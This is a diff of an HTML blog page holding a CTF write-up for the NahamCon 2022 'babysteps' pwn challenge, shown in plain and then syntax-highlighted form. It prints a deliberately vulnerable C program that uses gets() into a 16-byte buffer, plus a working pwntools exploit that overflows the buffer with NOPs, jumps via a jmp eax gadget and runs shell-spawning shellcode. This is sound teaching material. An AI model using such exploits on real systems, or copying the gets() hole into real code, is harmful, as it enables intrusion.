@@ -103,125 +103,125 @@ The C source code:
 <p>Become a baby! Take your first steps and jump around with BABY SIMULATOR 9000!</p>
 <p>This challenge provided a C source code and its binary.</p>
 <p>The C source code:</p>
-<pre tabindex="0"><code>#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;sys/stat.h&gt;
-
-
-#define BABYBUFFER 16
-
-void setup(void) {
-    setbuf(stdout, NULL);
-    setbuf(stdin, NULL);
-}
-
-void whine() {
-  puts(&#34;You whine: &#39;WAAAAAAHHHH!! WAAH, WAAHH, WAAAAAAHHHH&#39;\n&#34;);
-}
-
-void scream() {
-  puts(&#34;You scream: &#39;WAAAAAAHHHH!! WAAH, WAAHH, WAAAAAAHHHH&#39;\n&#34;);
-}
-
-void cry() {
-  puts(&#34;You cry: &#39;WAAAAAAHHHH!! WAAH, WAAHH, WAAAAAAHHHH&#39;\n&#34;);
-}
-
-void sleep() {
-  puts(&#34;Night night, baby!\n&#34;);
-  exit(-1);
-}
-
-
-void ask_baby_name() {
-  char buffer[BABYBUFFER];
-  puts(&#34;First, what is your baby name?&#34;);
-  return gets(buffer);
-}
-
-int main(int argc, char **argv){
-  setup();
-
-  puts(&#34;              _)_&#34;);
-  puts(&#34;           .-&#39;(/ &#39;-.&#34;);
-  puts(&#34;          /    `    \\&#34;);
-  puts(&#34;         /  -     -  \\&#34;);
-  puts(&#34;        (`  a     a  `)&#34;);
-  puts(&#34;         \\     ^     /&#34;);
-  puts(&#34;          &#39;. &#39;---&#39; .&#39;&#34;);
-  puts(&#34;          .-`&#39;---&#39;`-.&#34;);
-  puts(&#34;         /           \\&#34;);
-  puts(&#34;        /  / &#39;   &#39; \\  \\&#34;);
-  puts(&#34;      _/  /|       |\\  \\_&#34;);
-  puts(&#34;     `/|\\` |+++++++|`/|\\`&#34;);
-  puts(&#34;          /\\       /\\&#34;);
-  puts(&#34;          | `-._.-` |&#34;);
-  puts(&#34;          \\   / \\   /&#34;);
-  puts(&#34;          |_ |   | _|&#34;);
-  puts(&#34;          | _|   |_ |&#34;);
-  puts(&#34;          (ooO   Ooo)&#34;);
-  puts(&#34;&#34;);
-
-  puts(&#34;=== BABY SIMULATOR 9000 ===&#34;);
-
-  puts(&#34;How&#39;s it going, babies!!&#34;);
-  puts(&#34;Are you ready for the adventure of a lifetime? (literally?)&#34;);
-  puts(&#34;&#34;);
-  ask_baby_name();
-
-  puts(&#34;Pefect! Now let&#39;s get to being a baby!\n&#34;);
-
-  char menu_option;
-
-  do{
-
-    puts(&#34;CHOOSE A BABY ACTIVITY&#34;);
-    puts(&#34;a. Whine&#34;);
-    puts(&#34;b. Cry&#34;);
-    puts(&#34;c. Scream&#34;);
-    puts(&#34;d. Throw a temper tantrum&#34;);
-    puts(&#34;e. Sleep.&#34;);
-    scanf(&#34; %c&#34;,&amp;menu_option);
-
-    switch(menu_option){
-
-      case &#39;a&#39;:
-        whine();
-        break;
-      case &#39;b&#39;:
-        cry();
-        break;
-      case &#39;c&#39;:
-        scream();
-        break;
-      case &#39;d&#39;:
-        scream();
-        cry();
-        whine();
-        cry();
-        scream();
-        break;
-      case &#39;e&#39;:
-        sleep();
-        break;
-
-      default:
-        puts(&#34;WAAAAAAHHHH, THAT NO-NO!!!\n&#34;);
-        break;
-    }
-
-  }while(menu_option !=&#39;e&#39;);
-
-}
-</code></pre><p>Looking at the source code, we can see there is a BOF vulnerability lies at a function called <code>ask_baby_name</code>:</p>
-<pre tabindex="0"><code>void ask_baby_name() {
-  char buffer[BABYBUFFER];
-  puts(&#34;First, what is your baby name?&#34;);
-  return gets(buffer);
-}
-</code></pre><p>It asking for the baby name using <code>gets()</code> function which is insecure and the size of the buffer was set to 16 bytes which can be see here:</p>
-<pre tabindex="0"><code>#define BABYBUFFER 16
-</code></pre><h2 id="exploitation">Exploitation</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/stat.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define BABYBUFFER 16
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setup</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>    setbuf(stdout, NULL);
+</span></span><span style="display:flex;"><span>    setbuf(stdin, NULL);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">whine</span>() {
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;You whine: &#39;WAAAAAAHHHH!! WAAH, WAAHH, WAAAAAAHHHH&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">scream</span>() {
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;You scream: &#39;WAAAAAAHHHH!! WAAH, WAAHH, WAAAAAAHHHH&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">cry</span>() {
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;You cry: &#39;WAAAAAAHHHH!! WAAH, WAAHH, WAAAAAAHHHH&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sleep</span>() {
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Night night, baby!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ask_baby_name</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buffer[BABYBUFFER];
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;First, what is your baby name?&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> gets(buffer);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv){
+</span></span><span style="display:flex;"><span>  setup();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;              _)_&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;           .-&#39;(/ &#39;-.&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;          /    `    </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;         /  -     -  </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;        (`  a     a  `)&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;         </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">     ^     /&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;          &#39;. &#39;---&#39; .&#39;&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;          .-`&#39;---&#39;`-.&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;         /           </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;        /  / &#39;   &#39; </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">  </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;      _/  /|       |</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">  </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">_&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;     `/|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">` |+++++++|`/|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">`&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;          /</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">       /</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;          | `-._.-` |&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;          </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">   / </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">   /&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;          |_ |   | _|&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;          | _|   |_ |&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;          (ooO   Ooo)&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;=== BABY SIMULATOR 9000 ===&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;How&#39;s it going, babies!!&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Are you ready for the adventure of a lifetime? (literally?)&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>  ask_baby_name();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Pefect! Now let&#39;s get to being a baby!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> menu_option;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span>{
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;CHOOSE A BABY ACTIVITY&#34;</span>);
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;a. Whine&#34;</span>);
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;b. Cry&#34;</span>);
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;c. Scream&#34;</span>);
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;d. Throw a temper tantrum&#34;</span>);
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;e. Sleep.&#34;</span>);
+</span></span><span style="display:flex;"><span>    scanf(<span style="color:#e6db74">&#34; %c&#34;</span>,<span style="color:#f92672">&amp;</span>menu_option);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span>(menu_option){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        whine();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;b&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        cry();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;c&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        scream();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;d&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        scream();
+</span></span><span style="display:flex;"><span>        cry();
+</span></span><span style="display:flex;"><span>        whine();
+</span></span><span style="display:flex;"><span>        cry();
+</span></span><span style="display:flex;"><span>        scream();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;e&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        sleep();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;WAAAAAAHHHH, THAT NO-NO!!!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  }<span style="color:#66d9ef">while</span>(menu_option <span style="color:#f92672">!=</span><span style="color:#e6db74">&#39;e&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Looking at the source code, we can see there is a BOF vulnerability lies at a function called <code>ask_baby_name</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ask_baby_name</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buffer[BABYBUFFER];
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;First, what is your baby name?&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> gets(buffer);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>It asking for the baby name using <code>gets()</code> function which is insecure and the size of the buffer was set to 16 bytes which can be see here:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define BABYBUFFER 16
+</span></span></span></code></pre></div><h2 id="exploitation">Exploitation</h2>
 <p>First, we need to check any protections in this binary, we can use <code>checksec</code> for that, the result is:</p>
 <pre tabindex="0"><code>Arch:     i386-32-little
 RELRO:    Partial RELRO
@@ -236,38 +236,38 @@ RWX:      Has RWX segments
 <pre tabindex="0"><code>ropper -f babysteps --search jmp
 </code></pre><p><img src="/img/nahamconctf2022-babysteps/nahamcon-pwn2.png" alt="IMG"></p>
 <p>With all of the information we gathered, the final exploit script is:</p>
-<pre tabindex="0"><code>from pwn import *
-
-exe = &#39;./babysteps&#39;
-elf = context.binary = ELF(exe, checksec=False)
-
-# Start program
-#io = remote(&#34;challenge.nahamcon.com&#34;,31983)
-io = process(exe)
-
-offset = 28  
-
-shellcode = asm(shellcraft.sh())
-shellcode += asm(shellcraft.exit())
-
-jmp_eax = asm(&#39;jmp eax&#39;)
-jmp_eax = next(elf.search(jmp_eax))
-
-# Build payload 
-payload = flat([
-    b&#34;\x90&#34;*offset,
-    jmp_eax,
-    shellcode,
-])
-
-write(&#39;payload&#39;, payload)
-# Send the payload
-io.recvuntil(b&#34;name?\n&#34;)
-io.sendline(payload)
-
-# Get our shell
-io.interactive()
-</code></pre><p>From script above we basically use <code>shellcraft</code> to generate shellcode to spawn shell for us. For the payload structure, since this is 32-bit binary, we first overflow to the return function with NOP (&quot;\x90&quot;), then jmp_eax which means jump to the NOP we provided earlier, and the shellcode was after the NOP, hence it get executed.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./babysteps&#39;</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(exe, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Start program</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#io = remote(&#34;challenge.nahamcon.com&#34;,31983)</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process(exe)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">28</span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>sh())
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> asm(shellcraft<span style="color:#f92672">.</span>exit())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>jmp_eax <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">&#39;jmp eax&#39;</span>)
+</span></span><span style="display:flex;"><span>jmp_eax <span style="color:#f92672">=</span> next(elf<span style="color:#f92672">.</span>search(jmp_eax))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Build payload </span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> flat([
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span>offset,
+</span></span><span style="display:flex;"><span>    jmp_eax,
+</span></span><span style="display:flex;"><span>    shellcode,
+</span></span><span style="display:flex;"><span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>write(<span style="color:#e6db74">&#39;payload&#39;</span>, payload)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send the payload</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;name?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get our shell</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>From script above we basically use <code>shellcraft</code> to generate shellcode to spawn shell for us. For the payload structure, since this is 32-bit binary, we first overflow to the return function with NOP (&quot;\x90&quot;), then jmp_eax which means jump to the NOP we provided earlier, and the shellcode was after the NOP, hence it get executed.</p>
 <p>Result:</p>
 <p><img src="/img/nahamconctf2022-babysteps/nahamcon-pwn3.png" alt="IMG"></p>
 <p>Flag:</p>
